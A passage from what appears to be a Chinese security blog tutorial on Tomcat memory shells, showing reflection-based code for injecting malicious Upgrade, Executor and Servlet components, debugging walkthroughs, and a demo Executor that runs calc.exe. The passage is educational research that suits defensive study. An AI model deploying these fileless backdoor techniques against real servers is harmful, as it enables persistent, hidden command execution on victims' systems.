class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) response.get(request);</span><br><span class="line">                resp.doWrite(ByteBuffer.wrap(<span class="string">&quot;Hello, this my test Upgrade!&quot;</span>.getBytes()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">rf</span> <span class="operator">=</span> (RequestFacade) req;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(rf);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">MyUpgrade</span>().accept(request1.getCoyoteRequest());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151112722.png"></p><h3 id="2-14-2-Tomcat-Upgrade内存马介绍与相关代码调试分析"><a href="#2-14-2-Tomcat-Upgrade内存马介绍与相关代码调试分析" class="headerlink" title="2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析"></a>2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析</h3><p>这部分主要参考了<code>Sndav</code>师傅的文章（原文地址为<code>https://tttang.com/archive/1709/</code>，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：<code>https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/</code>）以及<code>p4d0rn</code>师傅的文章（<code>https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade</code>）。</p><p>和之前所提到的<code>Spring Interceptor</code>型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的Filter包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到<code>Filter</code>这一步之前就得打入内存马。</p><p>这里，我引用码哥字节文章（<code>https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</code>）里面的一张<code>Tomcat</code>架构图：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20200725210507.png"></p><p>可以清楚地看到，在此之前还有<code>Executor</code>和<code>Processor</code>两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。</p><p>这一部分需要更加完备的<code>Tomcat</code>的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好：</p><blockquote><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p></blockquote><p>其实在之前学习<code>Tomcat Valve</code>的过程中，当时我是一步步<code>step over</code>跟完了所有的代码的，我当时也提了一嘴<code>Http11Processor</code>。我们还是以当时的项目为例来看。</p><p>我们还是在<code>StandardHostValve.java</code>的这行打上断点：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233028436.png"></p><p>从上面我红色箭头所指出的地方就可以看到调用到了<code>process</code>函数，具体调用位置位于<code>org.apache.coyote.AbstractProcessorLight#process</code>，我们跟过去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233124074.png"></p><p>可以看到，如果当前<code>SocketWrapperBase</code>的状态是<code>OPEN_READ</code>的时候，才会调用对应的<code>processor</code>去处理（第二张图的<code>process</code>调用的位置可以通过第一张图左下角的那个<code>process</code>的后一个<code>process</code>点进去看到）：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233206768.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233758378.png"></p><p>我们继续<code>step into</code>这里的<code>service</code>方法看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234010670.png"></p><p>继续<code>step over</code>，可以看到这里在检查<code>header</code>中的<code>Connection</code>头中是否为<code>upgrade</code>，这一点可以通过<code>step into</code>这个<code>isConnectionToken</code>方法看到：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234324083.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234424354.png"></p><p>之后干两件事情：一是调用<code>getUpgradeProtocol</code>方法根据<code>upgradedName</code>从<code>httpUpgradeProtocols</code>拿到<code>UpgradeProtocol</code>；二是调用<code>UpgradeProtocol</code>对象的<code>accept</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234624306.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234945666.png"></p><p>到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的<code>UpgradeProtocol</code>，然后把它插入到<code>httpUpgradeProtocols</code>。</p><p>由于<code>httpUpgradeProtocols</code>是一个<code>hashmap</code>，那么向里面添加的话用到的肯定是<code>put</code>方法，直接搜<code>httpUpgradeProtocols.put</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131143446951.png"></p><p>我们在这行打上断点，然后调试，发现在我们没有执行<code>curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080</code>这条命令之前，断点就到了，也就是说，<code>httpUpgradeProtocols.put</code>这个事情是发生在<code>tomcat</code>启动的时候的。</p><p>那这样一来，思路就更加具体了一点：反射找到<code>httpUpgradeProtocols</code>，把恶意<code>upgradeProtocol</code>插入进去即可构成<code>upgrade</code>内存马，思路和之前是一模一样的。</p><p>那现在只需要解决最后一个问题——如何找到<code>httpUpgradeProtocols</code>的位置。我们打开之前用<code>tomcat</code>搭建的<code>Tomcat Upgrade</code>的<code>demo</code>，在如下位置打下断点，然后执行命令<code>curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080/evil</code>进入断点调试：：<br><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151457146.png"></p><p><code>step over</code>一步即可在下方看到<code>request1</code>属性：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151614135.png"></p><p>然后在<code>request1</code>里面的<code>connector</code>的<code>protocolHandler</code>里面发现了<code>httpUpgradeProtocols</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151700530.png"></p><p>接下来就是一步步地反射了。</p><h2 id="2-15-Tomcat-Executor内存马介绍与打入内存马思路分析"><a href="#2-15-Tomcat-Executor内存马介绍与打入内存马思路分析" class="headerlink" title="2.15 Tomcat Executor内存马介绍与打入内存马思路分析"></a>2.15 Tomcat Executor内存马介绍与打入内存马思路分析</h2><h3 id="2-15-1"><a href="#2-15-1" class="headerlink" title="2.15.1"></a>2.15.1</h3><p>新建一个项目，配置好<code>tomcat</code>运行环境和<code>web</code>目录，然后新建以下两个文件，第一个是TestExecutor.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.SynchronousQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestExecutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="number">0</span>, Integer.MAX_VALUE, <span class="number">60L</span>, TimeUnit.SECONDS, <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.execute(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个是<code>TestServlet.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">TestExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestExecutor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        executor.execute(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Execute method triggered by accessing /test&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后访问浏览器对应<code>context</code>下的<code>test</code>路由：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165507597.png"></p><h3 id="2-15-2-Tomcat-Executor内存马介绍与代码调试分析"><a href="#2-15-2-Tomcat-Executor内存马介绍与代码调试分析" class="headerlink" title="2.15.2 Tomcat Executor内存马介绍与代码调试分析"></a>2.15.2 Tomcat Executor内存马介绍与代码调试分析</h3><p>在<code>2.14.2</code>节中，我们聊到过可以在<code>Executor</code>模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇：</p><blockquote><p><a href="https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor">https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor</a></p><p><a href="https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/">https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/</a></p><p><a href="https://xz.aliyun.com/t/11593">https://xz.aliyun.com/t/11593</a></p><p><a href="https://xz.aliyun.com/t/11613">https://xz.aliyun.com/t/11613</a></p></blockquote><p>在我之前提到过的讲tomcat架构的基础文章（<code>https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</code>），有详细地讲述<code>ProtocolHandler</code>组件中的<code>EndPoint</code>部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用：</p><p><img src="https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/NioEndPoint.jpg"></p><h4 id="2-15-2-1-Endpoint五大组件"><a href="#2-15-2-1-Endpoint五大组件" class="headerlink" title="2.15.2.1 Endpoint五大组件"></a>2.15.2.1 Endpoint五大组件</h4><p>如下表所示：</p><table><thead><tr><th align="center">组件</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>LimitLatch</code></td><td align="center">连接控制器，控制最大连接数</td></tr><tr><td align="center"><code>Acceptor</code></td><td align="center">接收新连接并返回给<code>Poller</code>的<code>Channel</code>对象</td></tr><tr><td align="center"><code>Poller</code></td><td align="center">监控<code>Channel</code>状态，类似于<code>NIO</code>中的<code>Selector</code></td></tr><tr><td align="center"><code>SocketProcessor</code></td><td align="center">封装的任务类，处理连接的具体操作</td></tr><tr><td align="center"><code>Executor</code></td><td align="center"><code>Tomcat</code>自定义线程池，用于执行任务类</td></tr></tbody></table><h4 id="2-15-2-2-Endpoint分类"><a href="#2-15-2-2-Endpoint分类" class="headerlink" title="2.15.2.2 Endpoint分类"></a>2.15.2.2 Endpoint分类</h4><p><code>EndPoint</code>接口的具体实现类为<code>AbstractEndpoint</code>，<code>AbstractEndpoint</code>具体的实现类有<code>AprEndpoint</code>、<code>Nio2Endpoint</code>、<code>NioEndpoint</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131231807324.png"></p><table><thead><tr><th align="center">Endpoint</th><th align="center">简要解释</th><th align="center">Tomcat 源码位置</th></tr></thead><tbody><tr><td align="center"><code>AprEndpoint</code></td><td align="center">使用<code>APR</code>模式解决异步<code>IO</code>问题，提高性能</td><td align="center"><code>org.apache.tomcat.util.net.AprEndpoint</code></td></tr><tr><td align="center"><code>Nio2Endpoint</code></td><td align="center">使用代码实现异步<code>IO</code></td><td align="center"><code>org.apache.tomcat.util.net.Nio2Endpoint</code></td></tr><tr><td align="center"><code>NioEndpoint</code></td><td align="center">使用<code>Java NIO</code>实现非阻塞<code>IO</code></td><td align="center"><code>org.apache.tomcat.util.net.NioEndpoint</code></td></tr></tbody></table><p>上面所提到的<code>tomcat</code>，指的是如下<code>pom</code>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-coyote<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131232445734.png"></p><p><code>Tomcat</code>默认启动是以<code>NioEndpoint</code>来启动的，它是<code>Tomcat</code>中默认的负责使用<code>NIO</code>方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给<code>Processor</code>进行后续的处理。</p><h4 id="2-15-2-3-Executor相关代码分析"><a href="#2-15-2-3-Executor相关代码分析" class="headerlink" title="2.15.2.3 Executor相关代码分析"></a>2.15.2.3 Executor相关代码分析</h4><p>点开<code>Executor.java</code>即可看到有一个<code>execute</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145324525.png"><br><code>Ctrl+Alt+F7</code>追踪即可看到这个<code>Executor</code>接口在<code>AbstractEndpoint</code>这个抽象类中有相关实现：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145530939.png"></p><p>在<code>AbstractEndpoint.java</code>中搜索<code>executor</code>，往下翻即可看到有<code>setExecutor</code>和<code>getExecutor</code>这两个函数：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145641729.png"></p><p>查看<code>getExecutor</code>函数的调用位置，发现就在该文件中有一个关键调用：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145839900.png"></p><p>跟过去：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145913789.png"></p><p>从下面这篇文章中我们可以知道<code>processSocket</code>在<code>Tomcat</code>运行过程中的作用：</p><blockquote><p><a href="https://blog.51cto.com/u_8958931/2817418">https://blog.51cto.com/u_8958931/2817418</a></p></blockquote><p>那此时我们就有一个想法，如果我能控制<code>executor</code>，我把原来的<code>executor</code>通过<code>setExecutor</code>变成我恶意创建的<code>executor</code>，然后再通过这后面的<code>executor.execute</code>（<code>org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)</code>）一执行就可以加载我们的恶意逻辑了。</p><p>但是现在有一个很头疼的问题，那就是标准的<code>ServletRequest</code>需要经过<code>Adapter</code>的封装后才可获得，这里还在<code>Endpoint</code>阶段，其后面封装的<code>ServletRequest</code>和<code>ServletResponse</code>无法直接获取。</p><p>那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触<code>java-object-researcher</code>的时候，<code>c0ny1</code>师傅写的这篇文章：</p><blockquote><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165813229.png"></p><p><a href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165719046.png"></p></blockquote><p>那就试试看呗，我们导入<code>jar</code>包到项目之后修改<code>TestServlet.java</code>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">TestExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestExecutor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        executor.execute(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Execute method triggered by accessing /test&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;request&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">10</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着访问路由，然后在控制台输出中搜索<code>request = </code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170116366.png"></p><p>直接搜索到了这条链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; </span><br><span class="line">  ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">   ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">    ---&gt; [15] = &#123;java.lang.Thread&#125; </span><br><span class="line">     ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125; </span><br><span class="line">      ---&gt; this$0 = &#123;org.apache.tomcat.util.net.NioEndpoint&#125; </span><br><span class="line">       ---&gt; connections = &#123;java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;&#125; </span><br><span class="line">        ---&gt; [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = &#123;org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper&#125; </span><br><span class="line">         ---&gt; socket = &#123;org.apache.tomcat.util.net.NioChannel&#125; </span><br><span class="line">          ---&gt; appReadBufHandler = &#123;org.apache.coyote.http11.Http11InputBuffer&#125; </span><br><span class="line">            ---&gt; request = &#123;org.apache.coyote.Request&#125;</span><br></pre></td></tr></table></figure><p>我们来验证一下，在<code>org/apache/tomcat/util/net/NioEndpoint.java</code>的这里下断点，不断<code>step over</code>，就可以找到这里的<code>request</code>的位置：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170622846.png"></p><p>点开这里的<code>byteBuffer</code>，可以看到它是一个字节数组，右键找到<code>View as ... String</code>即可变成字符串：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170930400.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171007974.png"></p><p>再点击上面我指出来的<code>View Text</code>即可清楚看到具体内容：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171042514.png"></p><p>这就意味着我们可以把命令作为<code>header</code>的一部分传入，再把结果作为<code>header</code>的一部分传出即可。</p><h1 id="三、传统Web型内存马"><a href="#三、传统Web型内存马" class="headerlink" title="三、传统Web型内存马"></a>三、传统Web型内存马</h1><h2 id="3-1-Servlet内存马"><a href="#3-1-Servlet内存马" class="headerlink" title="3.1 Servlet内存马"></a>3.1 Servlet内存马</h2><h3 id="3-1-1-简单的servlet内存马demo编写"><a href="#3-1-1-简单的servlet内存马demo编写" class="headerlink" title="3.1.1 简单的servlet内存马demo编写"></a>3.1.1 简单的servlet内存马demo编写</h3><p>根据我们在上面的<code>2.3</code>节中的分析可以得出以下结论：</p><p>如果我们想要写一个<code>Servlet</code>内存马，需要经过以下步骤：</p><ul><li>找到<code>StandardContext</code></li><li>继承并编写一个恶意<code>servlet</code></li><li>创建<code>Wapper</code>对象</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</li><li>设置<code>Servlet</code>的<code>Name</code></li><li>设置<code>Servlet</code>对应的<code>Class</code></li><li>将<code>Servlet</code>添加到<code>context</code>的<code>children</code>中</li><li>将<code>url</code>路径和<code>servlet</code>类做映射</li></ul><p>由以上结论我们可以写出如下内存马<code>demo</code>：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.Servlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletResponse&quot;</span> 